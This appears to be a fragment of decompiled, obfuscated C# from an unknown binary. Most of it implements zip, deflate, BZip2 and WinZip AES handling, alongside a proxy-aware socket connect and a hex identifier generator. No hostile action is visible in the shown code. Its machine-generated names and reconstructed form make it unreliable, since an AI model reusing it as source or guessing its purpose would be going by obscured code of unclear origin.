					File.Move(gclass1_0.string_0, text);
				}
				Class6.smethod_364(gclass1_0, Enum6.const_13);
				File.Move((zipSegmentedStream != null) ? zipSegmentedStream.string_3 : gclass1_0.string_4, gclass1_0.string_0);
				Class6.smethod_364(gclass1_0, Enum6.const_14);
				if (text != null)
				{
					try
					{
						if (File.Exists(text))
						{
							File.Delete(text);
						}
					}
					catch
					{
					}
				}
				gclass1_0.bool_4 = true;
			}
			Class6.smethod_491(collection);
			Class6.smethod_484(gclass1_0);
			gclass1_0.bool_11 = true;
		}
		finally
		{
			Class6.smethod_54(gclass1_0);
		}
	}

	static Exception smethod_618(Class53 class53_0)
	{
		return class53_0.exception_0;
	}

	static IAsyncResult smethod_619(Class53 class53_0, string string_0, int int_0, AsyncCallback asyncCallback_0, object object_0)
	{
		if (string_0 == null || asyncCallback_0 == null)
		{
			throw new ArgumentNullException();
		}
		if (int_0 <= 0 || int_0 > 65535)
		{
			throw new ArgumentException();
		}
		class53_0.asyncCallback_0 = asyncCallback_0;
		if (class53_0.ProtocolType != ProtocolType.Tcp || Class6.smethod_169(class53_0) == Enum25.const_0 || Class6.smethod_120(class53_0) == null)
		{
			class53_0.int_0 = int_0;
			class53_0.class52_0 = Class6.smethod_433(string_0, (Delegate6)class53_0.method_2, class53_0);
			return Class6.smethod_515(class53_0);
		}
		if (Class6.smethod_169(class53_0) == Enum25.const_1)
		{
			class53_0.class52_0 = new Class55(class53_0, Class6.smethod_144(class53_0)).vmethod_0(string_0, int_0, class53_0.method_2, Class6.smethod_120(class53_0));
			return Class6.smethod_515(class53_0);
		}
		if (Class6.smethod_169(class53_0) == Enum25.const_2)
		{
			class53_0.class52_0 = new Class56(class53_0, Class6.smethod_144(class53_0), Class6.smethod_196(class53_0)).vmethod_0(string_0, int_0, class53_0.method_2, Class6.smethod_120(class53_0));
			return Class6.smethod_515(class53_0);
		}
		return null;
	}

	static bool smethod_620(Class45 class45_0, Stream11 stream11_0)
	{
		GClass2 gclass2_ = class45_0.gclass2_0;
		Class6.smethod_602(gclass2_);
		gclass2_.int_0 = 0;
		gclass2_.int_1 = class45_0.int_3;
		gclass2_.int_2 = 0;
		gclass2_.int_3 = class45_0.byte_1.Length;
		do
		{
			Class6.smethod_486(gclass2_, Enum19.const_0);
		}
		while (gclass2_.int_1 > 0 || gclass2_.int_3 == 0);
		Class6.smethod_486(gclass2_, Enum19.const_2);
		class45_0.int_4 = (int)gclass2_.long_1;
		return true;
	}

	static Stream smethod_621(uint uint_0, string string_0)
	{
		if (uint_0 >= 99)
		{
			throw new ArgumentOutOfRangeException("diskNumber");
		}
		string path = $"{Path.Combine(Path.GetDirectoryName(string_0), Path.GetFileNameWithoutExtension(string_0))}.z{uint_0 + 1:D2}";
		return File.Open(path, FileMode.Open, FileAccess.ReadWrite, FileShare.None);
	}

	static int smethod_622(Class73.Class75 class75_0)
	{
		return class75_0.int_2;
	}

	static uint smethod_623(ZipSegmentedStream zipSegmentedStream_0)
	{
		return zipSegmentedStream_0.uint_0;
	}

	static void smethod_624(int int_0, Stream9 stream9_0)
	{
		if (stream9_0.bool_0)
		{
			throw new ObjectDisposedException("DeflateStream");
		}
		if (stream9_0.stream12_0.byte_0 != null)
		{
			throw new GException0("The working buffer is already set.");
		}
		if (int_0 < 1024)
		{
			throw new GException0($"Don't be silly. {int_0} bytes?? Use a bigger buffer, at least {1024}.");
		}
		stream9_0.stream12_0.int_0 = int_0;
	}

	static Class73.Class77 smethod_625(Class73.Class78 class78_0)
	{
		byte[] array = new byte[class78_0.int_3];
		Array.Copy(class78_0.byte_1, 0, array, 0, class78_0.int_3);
		return new Class73.Class77(array);
	}

	static EventArgs2 smethod_626(string string_0)
	{
		return new EventArgs2(string_0, Enum6.const_2);
	}

	static int smethod_627(int int_0, Class73.Class76 class76_0, int int_1, byte[] byte_0)
	{
		int num = class76_0.int_0;
		if (int_1 > class76_0.int_1)
		{
			int_1 = class76_0.int_1;
		}
		else
		{
			num = (class76_0.int_0 - class76_0.int_1 + int_1) & 0x7FFF;
		}
		int num2 = int_1;
		int num3 = int_1 - num;
		if (num3 > 0)
		{
			Array.Copy(class76_0.byte_0, 32768 - num3, byte_0, int_0, num3);
			int_0 += num3;
			int_1 = num;
		}
		Array.Copy(class76_0.byte_0, num - int_1, byte_0, int_0, int_1);
		class76_0.int_1 -= num2;
		if (class76_0.int_1 < 0)
		{
			throw new InvalidOperationException();
		}
		return num2;
	}

	static bool smethod_628(Class73.Class74 class74_0)
	{
		int num = Class6.smethod_74(class74_0.class76_0);
		while (num >= 258)
		{
			switch (class74_0.int_4)
			{
			case 7:
			{
				int num2;
				while (((num2 = Class6.smethod_386(class74_0.class77_0, class74_0.class75_0)) & -256) == 0)
				{
					Class6.smethod_537(class74_0.class76_0, num2);
					if (--num < 258)
					{
						return true;
					}
				}
				if (num2 >= 257)
				{
					class74_0.int_6 = Class73.Class74.int_0[num2 - 257];
					class74_0.int_5 = Class73.Class74.int_1[num2 - 257];
					goto case 8;
				}
				if (num2 < 0)
				{
					return false;
				}
				class74_0.class77_1 = null;
				class74_0.class77_0 = null;
				class74_0.int_4 = 2;
				return true;
			}
			case 8:
				if (class74_0.int_5 > 0)
				{
					class74_0.int_4 = 8;
					int num4 = Class6.smethod_366(class74_0.class75_0, class74_0.int_5);
					if (num4 < 0)
					{
						return false;
					}
					Class6.smethod_409(class74_0.class75_0, class74_0.int_5);
					class74_0.int_6 += num4;
				}
				class74_0.int_4 = 9;
				goto case 9;
			case 9:
			{
				int num2 = Class6.smethod_386(class74_0.class77_1, class74_0.class75_0);
				if (num2 >= 0)
				{
					class74_0.int_7 = Class73.Class74.int_2[num2];
					class74_0.int_5 = Class73.Class74.int_3[num2];
					goto case 10;
				}
				return false;
			}
			case 10:
				if (class74_0.int_5 > 0)
				{
					class74_0.int_4 = 10;
					int num3 = Class6.smethod_366(class74_0.class75_0, class74_0.int_5);
					if (num3 < 0)
					{
						return false;
					}
					Class6.smethod_409(class74_0.class75_0, class74_0.int_5);
					class74_0.int_7 += num3;
				}
				Class6.smethod_435(class74_0.class76_0, class74_0.int_6, class74_0.int_7);
				num -= class74_0.int_6;
				class74_0.int_4 = 7;
				break;
			}
		}
		return true;
	}

	static void smethod_629(Form1.Class0 class0_0)
	{
		class0_0.int_0 = -1;
		if (class0_0.ienumerator_0 != null)
		{
			class0_0.ienumerator_0.Dispose();
		}
	}

	static int smethod_630(int int_0, Enum20 enum20_0, GClass2 gclass2_0)
	{
		gclass2_0.enum20_0 = enum20_0;
		gclass2_0.int_4 = int_0;
		return Class6.smethod_128(gclass2_0, bool_0: true);
	}

	static object smethod_631(Class53 class53_0)
	{
		return class53_0.object_0;
	}

	static void smethod_632(Stream11 stream11_0, bool bool_0, bool bool_1)
	{
		if (stream11_0.bool_1)
		{
			return;
		}
		stream11_0.bool_1 = true;
		if (bool_0 || bool_1)
		{
			stream11_0.autoResetEvent_0.WaitOne();
		}
		do
		{
			int num = -1;
			int num2 = (bool_0 ? 200 : (bool_1 ? (-1) : 0));
			int num3 = -1;
			do
			{
				if (!Monitor.TryEnter(stream11_0.queue_0, num2))
				{
					num3 = -1;
					continue;
				}
				num3 = -1;
				try
				{
					if (stream11_0.queue_0.Count > 0)
					{
						num3 = stream11_0.queue_0.Dequeue();
					}
				}
				finally
				{
					Monitor.Exit(stream11_0.queue_0);
				}
				if (num3 < 0)
				{
					continue;
				}
				Class45 @class = stream11_0.list_0[num3];
				if (@class.int_2 != stream11_0.int_6 + 1)
				{
					lock (stream11_0.queue_0)
					{
						stream11_0.queue_0.Enqueue(num3);
					}
					if (num == num3)
					{
						stream11_0.autoResetEvent_0.WaitOne();
						num = -1;
					}
					else if (num == -1)
					{
						num = num3;
					}
					continue;
				}
				num = -1;
				stream11_0.stream_0.Write(@class.byte_1, 0, @class.int_4);
				GClass3 gclass3_ = stream11_0.gclass3_0;
				int int_ = @class.int_0;
				int int_2 = @class.int_3;
				Class6.smethod_14(int_, int_2, gclass3_);
				stream11_0.long_0 += @class.int_3;
				@class.int_3 = 0;
				stream11_0.int_6 = @class.int_2;
				stream11_0.queue_1.Enqueue(@class.int_1);
				if (num2 == -1)
				{
					num2 = 0;
				}
			}
			while (num3 >= 0);
		}
		while (bool_0 && stream11_0.int_6 != stream11_0.int_7);
		stream11_0.bool_1 = false;
	}

	static void smethod_633(string string_0, GClass1 gclass1_0)
	{
		foreach (GClass0 item in Class6.smethod_546(gclass1_0, string_0))
		{
			item.Password = gclass1_0.string_3;
			Class6.smethod_554(item);
		}
	}

	static void smethod_634(short[] short_0, int int_0, Class38 class38_0)
	{
		int num = -1;
		int num2 = short_0[1];
		int num3 = 0;
		int num4 = 7;
		int num5 = 4;
		if (num2 == 0)
		{
			num4 = 138;
			num5 = 3;
		}
		short_0[(int_0 + 1) * 2 + 1] = short.MaxValue;
		for (int i = 0; i <= int_0; i++)
		{
			int num6 = num2;
			num2 = short_0[(i + 1) * 2 + 1];
			if (++num3 < num4 && num6 == num2)
			{
				continue;
			}
			if (num3 < num5)
			{
				class38_0.short_4[num6 * 2] = (short)(class38_0.short_4[num6 * 2] + num3);
			}
			else if (num6 != 0)
			{
				if (num6 != num)
				{
					class38_0.short_4[num6 * 2]++;
				}
				class38_0.short_4[Class48.int_7 * 2]++;
			}
			else if (num3 <= 10)
			{
				class38_0.short_4[Class48.int_8 * 2]++;
			}
			else
			{
				class38_0.short_4[Class48.int_9 * 2]++;
			}
			num3 = 0;
			num = num6;
			if (num2 == 0)
			{
				num4 = 138;
				num5 = 3;
			}
			else if (num6 == num2)
			{
				num4 = 6;
				num5 = 3;
			}
			else
			{
				num4 = 7;
				num5 = 4;
			}
		}
	}

	static void smethod_635(int int_0, int int_1, Stream6 stream6_0)
	{
		Stream6.Class34 class34_ = stream6_0.class34_0;
		char[][] char_ = class34_.char_0;
		for (int i = 0; i < int_0; i++)
		{
			int num = 32;
			int num2 = 0;
			char[] array = char_[i];
			int num3 = int_1;
			while (--num3 >= 0)
			{
				char c = array[num3];
				if (c > num2)
				{
					num2 = c;
				}
				if (c < num)
				{
					num = c;
				}
			}
			int[] int_2 = class34_.int_1[i];
			int[] int_3 = class34_.int_2[i];
			int[] int_4 = class34_.int_3[i];
			char[] char_2 = char_[i];
			Class6.smethod_85(int_1, num, int_3, num2, int_4, char_2, int_2);
			class34_.int_4[i] = num;
		}
	}

	static int smethod_636(int int_0, GClass3 gclass3_0, byte byte_0)
	{
		return Class6.smethod_400((uint)int_0, byte_0, gclass3_0);
	}

	static void smethod_637(Class38 class38_0, int int_0, int int_1, bool bool_0)
	{
		Class6.smethod_465(class38_0, (Class38.int_7 << 1) + (bool_0 ? 1 : 0), 3);
		Class6.smethod_150(bool_0: true, class38_0, int_0, int_1);
	}

	static void smethod_638(Stream11 stream11_0)
	{
		byte[] array = new byte[128];
		GClass2 gClass = new GClass2();
		int num = Class6.smethod_92(stream11_0.enum20_0, gClass, bool_0: false);
		gClass.byte_0 = null;
		gClass.int_0 = 0;
		gClass.int_1 = 0;
		gClass.byte_1 = array;
		gClass.int_2 = 0;
		gClass.int_3 = array.Length;
		num = Class6.smethod_486(gClass, Enum19.const_4);
		if (num != 1 && num != 0)
		{
			throw new Exception("deflating: " + gClass.string_0);
		}
		if (array.Length - gClass.int_3 > 0)
		{
			stream11_0.stream_0.Write(array, 0, array.Length - gClass.int_3);
		}
		Class6.smethod_591(gClass);
		stream11_0.int_8 = (int)(~stream11_0.gclass3_0.uint_2);
	}

	static int smethod_639(Class40 class40_0, int int_0)
	{
		int num = 0;
		while (true)
		{
			if (num >= 2)
			{
				return int_0;
			}
			int num2 = ((num != 0) ? (class40_0.int_13 - class40_0.int_12) : (((class40_0.int_12 <= class40_0.int_13) ? class40_0.int_13 : class40_0.int_11) - class40_0.int_12));
			if (num2 == 0)
			{
				break;
			}
			if (num2 > class40_0.gclass2_0.int_3)
			{
				num2 = class40_0.gclass2_0.int_3;
			}
			if (num2 != 0 && int_0 == -5)
			{
				int_0 = 0;
			}
			class40_0.gclass2_0.int_3 -= num2;
			class40_0.gclass2_0.long_1 += num2;
			if (class40_0.object_0 != null)
			{
				class40_0.gclass2_0.uint_0 = (class40_0.uint_0 = Class6.smethod_439(class40_0.uint_0, class40_0.byte_0, class40_0.int_12, num2));
			}
			Array.Copy(class40_0.byte_0, class40_0.int_12, class40_0.gclass2_0.byte_1, class40_0.gclass2_0.int_2, num2);
			class40_0.gclass2_0.int_2 += num2;
			class40_0.int_12 += num2;
			if (class40_0.int_12 == class40_0.int_11 && num == 0)
			{
				class40_0.int_12 = 0;
				if (class40_0.int_13 == class40_0.int_11)
				{
					class40_0.int_13 = 0;
				}
			}
			else
			{
				num++;
			}
			num++;
		}
		if (int_0 == -5)
		{
			int_0 = 0;
		}
		return int_0;
	}

	static GClass0 smethod_640(string string_0, string string_1)
	{
		return Class6.smethod_597((object)string_0, string_1, Enum0.const_1, (object)null);
	}

	static void smethod_641(int int_0, Class32 class32_0, int int_1)
	{
		int[][] int_2 = class32_0.class33_0.int_3;
		byte[][] byte_ = class32_0.class33_0.byte_4;
		for (int i = 0; i < int_0; i++)
		{
			int num = 32;
			int num2 = 0;
			byte[] array = byte_[i];
			int num3 = int_1;
			while (--num3 >= 0)
			{
				int num4 = array[num3] & 0xFF;
				if (num4 > num2)
				{
					num2 = num4;
				}
				if (num4 < num)
				{
					num = num4;
				}
			}
			int[] int_3 = int_2[i];
			byte[] byte_2 = byte_[i];
			Class6.smethod_107(int_1, num, int_3, byte_2, num2);
		}
	}

	static void smethod_642(string string_0, GClass1 gclass1_0, string string_1)
	{
		foreach (GClass0 item in Class6.smethod_76(string_0, string_1, gclass1_0))
		{
			item.Password = gclass1_0.string_3;
			Class6.smethod_554(item);
		}
	}

	static void smethod_643(Class46 class46_0, Class38 class38_0)
	{
		short[] short_ = class46_0.short_0;
		short[] short_2 = class46_0.class49_0.short_2;
		int int_ = class46_0.class49_0.int_2;
		int num = -1;
		class38_0.int_41 = 0;
		class38_0.int_42 = Class46.int_0;
		for (int i = 0; i < int_; i++)
		{
			if (short_[i * 2] != 0)
			{
				num = (class38_0.int_40[++class38_0.int_41] = i);
				class38_0.sbyte_1[i] = 0;
			}
			else
			{
				short_[i * 2 + 1] = 0;
			}
		}
		int num2;
		while (class38_0.int_41 < 2)
		{
			num2 = (class38_0.int_40[++class38_0.int_41] = ((num < 2) ? (++num) : 0));
			short_[num2 * 2] = 1;
			class38_0.sbyte_1[num2] = 0;
			class38_0.int_47--;
			if (short_2 != null)
			{
				class38_0.int_48 -= short_2[num2 * 2 + 1];
			}
		}
		class46_0.int_6 = num;
		for (int i = class38_0.int_41 / 2; i >= 1; i--)
		{
			Class6.smethod_47(class38_0, short_, i);
		}
		num2 = int_;
		do
		{
			int i = class38_0.int_40[1];
			class38_0.int_40[1] = class38_0.int_40[class38_0.int_41--];
			Class6.smethod_47(class38_0, short_, 1);
			int num3 = class38_0.int_40[1];
			class38_0.int_40[--class38_0.int_42] = i;
			class38_0.int_40[--class38_0.int_42] = num3;
			short_[num2 * 2] = (short)(short_[i * 2] + short_[num3 * 2]);
			class38_0.sbyte_1[num2] = (sbyte)(Math.Max((byte)class38_0.sbyte_1[i], (byte)class38_0.sbyte_1[num3]) + 1);
			short_[i * 2 + 1] = (short_[num3 * 2 + 1] = (short)num2);
			class38_0.int_40[1] = num2++;
			Class6.smethod_47(class38_0, short_, 1);
		}
		while (class38_0.int_41 >= 2);
		class38_0.int_40[--class38_0.int_42] = class38_0.int_40[1];
		Class6.smethod_137(class46_0, class38_0);
		Class6.smethod_139(class38_0.short_5, num, short_);
	}

	static GClass0 smethod_644(Delegate2 delegate2_0, GClass1 gclass1_0, string string_0, Delegate1 delegate1_0)
	{
		Class6.smethod_26(string_0, gclass1_0);
		return Class6.smethod_311(delegate1_0, gclass1_0, delegate2_0, string_0);
	}

	static byte[] smethod_645(Class19 class19_0)
	{
		if (!class19_0.bool_0)
		{
			Class6.smethod_35(class19_0);
		}
		return class19_0.byte_5;
	}

	static int smethod_646(GClass0 gclass0_0)
	{
		if (!gclass0_0.bool_5)
		{
			Stream stream = null;
			if (gclass0_0.enum0_0 == Enum0.const_4)
			{
				Stream13 stream2 = new Stream13(Stream.Null);
				gclass0_0.delegate0_0(gclass0_0.string_1, stream2);
				gclass0_0.int_2 = Class6.smethod_336(stream2);
			}
			else if (gclass0_0.enum0_0 != Enum0.const_3)
			{
				if (gclass0_0.enum0_0 == Enum0.const_2)
				{
					Class6.smethod_286(gclass0_0);
					stream = gclass0_0.stream_1;
				}
				else if (gclass0_0.enum0_0 == Enum0.const_5)
				{
					if (gclass0_0.stream_1 == null)
					{
						gclass0_0.stream_1 = gclass0_0.delegate1_0(gclass0_0.string_1);
					}
					Class6.smethod_286(gclass0_0);
					stream = gclass0_0.stream_1;
				}
				else if (gclass0_0.enum0_0 != Enum0.const_6)
				{
					stream = File.Open(gclass0_0.string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
				}
				GClass3 gclass3_ = new GClass3();
				gclass0_0.int_2 = Class6.smethod_490(stream, gclass3_);
				if (gclass0_0.stream_1 == null)
				{
					stream.Dispose();
				}
			}
			gclass0_0.bool_5 = true;
		}
		return gclass0_0.int_2;
	}

	static Enum21 smethod_647(Class8 class8_0)
	{
		if (class8_0.gclass1_0 != null)
		{
			return class8_0.gclass1_0.enum21_0;
		}
		return class8_0.stream0_0.method_1();
	}

	static void smethod_648(string string_0, GClass1 gclass1_0, Enum3 enum3_0)
	{
		foreach (GClass0 item in Class6.smethod_546(gclass1_0, string_0))
		{
			item.Password = gclass1_0.string_3;
			Class6.smethod_466(enum3_0, item);
		}
	}

	static string smethod_649(ZipSegmentedStream zipSegmentedStream_0)
	{
		if (zipSegmentedStream_0.string_2 == null)
		{
			zipSegmentedStream_0.string_2 = Class6.smethod_571(zipSegmentedStream_0, zipSegmentedStream_0.uint_0);
		}
		return zipSegmentedStream_0.string_2;
	}

	static string smethod_650()
	{
		byte[] byte_ = new byte[8];
		if (!Class6.smethod_422(ref byte_))
		{
			return "ND";
		}
		return string.Format("{0}{1}", BitConverter.ToUInt32(byte_, 4).ToString("X8"), BitConverter.ToUInt32(byte_, 0).ToString("X8"));
	}

	static Stream smethod_651(Class8 class8_0)
	{
		if (class8_0.gclass1_0 != null)
		{
			return class8_0.gclass1_0.ReadStream;
		}
		return class8_0.stream1_0.stream_0;
	}

	static int smethod_652(Stream stream_0, byte[] byte_0, int int_0, int int_1, string string_0)
	{
		//IL_0016: Unknown result type (might be due to invalid IL or missing references)
		//IL_001d: Expected O, but got Unknown
		int result = 0;
		bool flag = false;
		int num = 0;
		do
		{
			try
			{
				result = stream_0.Read(byte_0, int_0, int_1);
				flag = true;
			}
			catch (IOException ex)
			{
				SecurityPermission val = new SecurityPermission(SecurityPermissionFlag.UnmanagedCode);
				if (val.IsUnrestricted())
				{
					uint num2 = Class6.smethod_509((Exception)ex);
					if (num2 != 2147942433u)
					{
						throw new IOException($"Cannot read file {string_0}", ex);
					}
					num++;
					if (num > 10)
					{
						throw new IOException($"Cannot read file {string_0}, at offset 0x{int_0:X8} after 10 retries", ex);
					}
					Thread.Sleep(250 + num * 550);
					continue;
				}
				throw;
			}
		}
		while (!flag);
		return result;
	}

	static void smethod_653(Class52 class52_0, Class53 class53_0)
	{
		class53_0.class52_0 = class52_0;
	}

	static void smethod_654(GClass3 gclass3_0)
	{
		gclass3_0.uint_2 = uint.MaxValue;
	}

	static string smethod_655(Class14 class14_0)
	{
		string text = "";
		if ((class14_0.fileAttributes_0 & FileAttributes.Hidden) != 0)
		{
			text += "H";
		}
		if ((class14_0.fileAttributes_0 & FileAttributes.System) != 0)
		{
			text += "S";
		}
		if ((class14_0.fileAttributes_0 & FileAttributes.ReadOnly) != 0)
		{
			text += "R";
		}
		if ((class14_0.fileAttributes_0 & FileAttributes.Archive) != 0)
		{
			text += "A";
		}
		if ((class14_0.fileAttributes_0 & FileAttributes.ReparsePoint) != 0)
		{
			text += "L";
		}
		if ((class14_0.fileAttributes_0 & FileAttributes.NotContentIndexed) != 0)
		{
			text += "I";
		}
		return text;
	}

	static uint smethod_656(ZipSegmentedStream zipSegmentedStream_0, int int_0)
	{
		if (zipSegmentedStream_0.stream_0.Position + int_0 > zipSegmentedStream_0.int_0)
		{
			return zipSegmentedStream_0.uint_0 + 1;
		}
		return zipSegmentedStream_0.uint_0;
	}

	static int smethod_657(int int_0, Class43 class43_0, GClass2 gclass2_0)
	{
		class43_0.gclass2_0 = gclass2_0;
		class43_0.gclass2_0.string_0 = null;
		class43_0.class40_0 = null;
		if (int_0 >= 8 && int_0 <= 15)
		{
			class43_0.int_2 = int_0;
			class43_0.class40_0 = new Class40(gclass2_0, class43_0.bool_0 ? class43_0 : null, 1 << int_0);
			Class6.smethod_198(class43_0);
			return 0;
		}
		Class6.smethod_528(class43_0);
		throw new GException0("Bad window size.");
	}

	static string smethod_658()
	{
		return Class6.smethod_650();
	}

	static bool smethod_659(Class32 class32_0, bool bool_0)
	{
		class32_0.int_5++;
		int int_ = class32_0.int_3;
		if (int_ >= class32_0.int_4 && !bool_0)
		{
			string message = string.Format("block overrun(final={2}): {0} >= threshold ({1})", int_, class32_0.int_4, bool_0);
			throw new Exception(message);
		}
		byte b = (byte)class32_0.int_1;
		byte[] byte_ = class32_0.class33_0.byte_6;
		class32_0.class33_0.bool_0[b] = true;
		int int_2 = class32_0.int_2;
		Class6.smethod_2(int_2, class32_0.gclass3_0, b);
		switch (int_2)
		{
		default:
			int_2 -= 4;
			class32_0.class33_0.bool_0[int_2] = true;
			byte_[int_ + 2] = b;
			byte_[int_ + 3] = b;
			byte_[int_ + 4] = b;
			byte_[int_ + 5] = b;
			byte_[int_ + 6] = (byte)int_2;
			class32_0.int_3 = int_ + 5;
			break;
		case 1:
			byte_[int_ + 2] = b;
			class32_0.int_3 = int_ + 1;
			break;
		case 2:
			byte_[int_ + 2] = b;
			byte_[int_ + 3] = b;
			class32_0.int_3 = int_ + 2;
			break;
		case 3:
			byte_[int_ + 2] = b;
			byte_[int_ + 3] = b;
			byte_[int_ + 4] = b;
			class32_0.int_3 = int_ + 3;
			break;
		}
		return class32_0.int_3 >= class32_0.int_4;
	}

	static byte[] smethod_660(int int_0, Class54 class54_0)
	{
		return new byte[2]
		{
			(byte)(int_0 / 256),
			(byte)(int_0 % 256)
		};
	}

	static void smethod_661(Socket socket_0, Class63 class63_0)
	{
		if (socket_0 == null)
		{
			throw new ArgumentNullException();
		}
		class63_0.socket_0 = socket_0;
	}

	static void smethod_662(ZipSegmentedStream zipSegmentedStream_0)
	{
		if (zipSegmentedStream_0.stream_0 != null)
		{
			zipSegmentedStream_0.stream_0.Dispose();
		}
		if (zipSegmentedStream_0.uint_0 + 1 == zipSegmentedStream_0.uint_1)
		{
			zipSegmentedStream_0.string_2 = zipSegmentedStream_0.string_0;
		}
		zipSegmentedStream_0.stream_0 = File.OpenRead(Class6.smethod_649(zipSegmentedStream_0));
	}

	static void smethod_663(Stream3 stream3_0, byte[] byte_0, int int_0)
	{
		Array.Copy(BitConverter.GetBytes(stream3_0.int_0++), 0, stream3_0.byte_0, 0, 4);
		stream3_0.icryptoTransform_0.TransformBlock(stream3_0.byte_0, 0, 16, stream3_0.byte_1, 0);
		Class6.smethod_529(stream3_0, byte_0, int_0, 16);
		stream3_0.hmacsha1_0.TransformBlock(byte_0, int_0, 16, null, 0);
	}

	static void smethod_664(Class73.Class76 class76_0, int int_0, int int_1, int int_2)
	{
		while (int_1-- > 0)
		{
			class76_0.byte_0[class76_0.int_0++] = class76_0.byte_0[int_0++];
			class76_0.int_0 &= 32767;
			int_0 &= 0x7FFF;
		}
	}

	static GClass1 smethod_665(Stream stream_0, TextWriter textWriter_0, Encoding encoding_0, EventHandler<EventArgs1> eventHandler_0)
	{
		if (stream_0 == null)
		{
			throw new ArgumentNullException("zipStream");
		}
		GClass1 gClass = new GClass1();
		gClass.textWriter_0 = textWriter_0;
		gClass.encoding_0 = encoding_0 ?? GClass1.encoding_1;
		gClass.enum9_0 = Enum9.const_3;
		if (eventHandler_0 != null)
		{
			gClass.ReadProgress += eventHandler_0;
		}
		gClass.stream_0 = ((stream_0.Position == 0L) ? stream_0 : new Stream2(stream_0));
		gClass.bool_7 = false;
		if (gClass.textWriter_0 != null)
		{
			gClass.textWriter_0.WriteLine("reading from stream...");
		}
		Class6.smethod_101(gClass);
		return gClass;
	}

	static void smethod_666(int int_0, GClass0 gclass0_0, GClass1 gclass1_0, bool bool_0)
	{
		EventHandler<EventArgs3> eventHandler_ = gclass1_0.eventHandler_0;
		if (eventHandler_ != null)
		{
			EventArgs3 eventArgs = new EventArgs3(gclass1_0.ArchiveNameForEvent, bool_0, gclass1_0.dictionary_0.Count, int_0, gclass0_0);
			eventHandler_(gclass1_0, eventArgs);
			if (eventArgs.bool_0)
			{
				gclass1_0.bool_8 = true;
			}
		}
	}

	static void smethod_667(int int_0, int int_1, Class32 class32_0)
	{
		Class32.Class33 class33_ = class32_0.class33_0;
		byte[] byte_ = class33_.byte_5;
		int num = int_1;
		while (--num >= 0)
		{
			byte_[num] = (byte)num;
		}
		for (int i = 0; i < int_0; i++)
		{
			byte b = class33_.byte_1[i];
			byte b2 = byte_[0];
			int num2 = 0;
			while (b != b2)
			{
				num2++;
				byte b3 = b2;
				b2 = byte_[num2];
				byte_[num2] = b3;
			}
			byte_[0] = b2;
			class33_.byte_2[i] = (byte)num2;
		}
	}

	static void smethod_668(Class31 class31_0)
	{
		Class6.smethod_304(class31_0);
		if (class31_0.int_0 > 0)
		{
			byte value = (byte)((class31_0.uint_0 >> 24) & 0xFFu);
			class31_0.stream_0.WriteByte(value);
			class31_0.int_1++;
		}
	}

	static GClass0 smethod_669(string string_0, byte[] byte_0, GClass1 gclass1_0)
	{
		Class6.smethod_26(string_0, gclass1_0);
		return Class6.smethod_530(string_0, byte_0, gclass1_0);
	}

	static int smethod_670(GClass0 gclass0_0, byte[] byte_0, int int_0, short short_0, long long_0)
	{
		if (gclass0_0.short_8 == 99)
		{
			if ((gclass0_0.short_7 & 1) != 1)
			{
				throw new BadReadException($"  Inconsistent metadata at position 0x{long_0:X16}");
			}
			gclass0_0.bool_8 = true;
			if (short_0 != 7)
			{
				throw new BadReadException($"  Inconsistent size (0x{short_0:X4}) in WinZip AES field at position 0x{long_0:X16}");
			}
			gclass0_0.short_5 = BitConverter.ToInt16(byte_0, int_0);
			int_0 += 2;
			if (gclass0_0.short_5 != 1 && gclass0_0.short_5 != 2)
			{
				throw new BadReadException($"  Unexpected vendor version number (0x{gclass0_0.short_5:X4}) for WinZip AES metadata at position 0x{long_0:X16}");
			}
			short num = BitConverter.ToInt16(byte_0, int_0);
			int_0 += 2;
			if (num != 17729)
			{
				throw new BadReadException($"  Unexpected vendor ID (0x{num:X4}) for WinZip AES metadata at position 0x{long_0:X16}");
			}
			int num2 = ((byte_0[int_0] == 1) ? 128 : ((byte_0[int_0] == 3) ? 256 : (-1)));
			if (num2 < 0)
			{
				throw new BadReadException($"Invalid key strength ({num2})");
			}
			gclass0_0.enum2_1 = (gclass0_0.enum2_0 = ((num2 == 128) ? Enum2.const_2 : Enum2.const_3));
			int_0++;
			gclass0_0.short_9 = (gclass0_0.short_8 = BitConverter.ToInt16(byte_0, int_0));
			int_0 += 2;
		}
		return int_0;
	}

	static void smethod_671(Form1.Class0 class0_0)
	{
		class0_0.int_0 = -1;
		if (class0_0.ienumerator_1 != null)
		{
			class0_0.ienumerator_1.Dispose();
		}
	}

	static void smethod_672(Stream7 stream7_0)
	{
		byte[] array = new byte[4] { 66, 90, 104, 0 };
		array[3] = (byte)(48 + stream7_0.int_1);
		byte[] array2 = array;
		stream7_0.stream_0.Write(array2, 0, array2.Length);
	}

	static ReadOnlyCollection<string> smethod_673(string string_0, Class16 class16_0, bool bool_0)
	{
		if (class16_0.class9_0 == null)
		{
			throw new ArgumentException("SelectionCriteria has not been set");
		}
		List<string> list = new List<string>();
		try
		{
			if (Directory.Exists(string_0))
			{
				string[] files = Directory.GetFiles(string_0);
				string[] array = files;
				foreach (string text in array)
				{
					if (Class6.smethod_10(class16_0, text))
					{
						list.Add(text);
					}
				}
				if (bool_0)
				{
					string[] directories = Directory.GetDirectories(string_0);
					string[] array2 = directories;
					foreach (string text2 in array2)
					{
						if (class16_0.method_0() || (File.GetAttributes(text2) & FileAttributes.ReparsePoint) == 0)
						{
							if (Class6.smethod_10(class16_0, text2))
							{
								list.Add(text2);
							}
							list.AddRange(Class6.smethod_673(text2, class16_0, bool_0));
						}
					}
				}
			}
		}
		catch (UnauthorizedAccessException)
		{
		}
		catch (IOException)
		{
		}
		return list.AsReadOnly();
	}

	static int smethod_674(GClass2 gclass2_0)
	{
		if (gclass2_0.class43_0 == null)
		{
			throw new GException0("No Inflate State!");
		}
		return Class6.smethod_592(gclass2_0.class43_0);
	}

	static void smethod_675(Class38 class38_0, int int_0, short[] short_0)
	{
		int num = int_0 * 2;
		Class6.smethod_465(class38_0, short_0[num] & 0xFFFF, short_0[num + 1] & 0xFFFF);
	}

	static EventArgs1 smethod_676(GClass0 gclass0_0, string string_0, int int_0)
	{
		EventArgs1 eventArgs = new EventArgs1(string_0, Enum6.const_5);
		eventArgs.int_0 = int_0;
		eventArgs.gclass0_0 = gclass0_0;
		return eventArgs;
	}
}
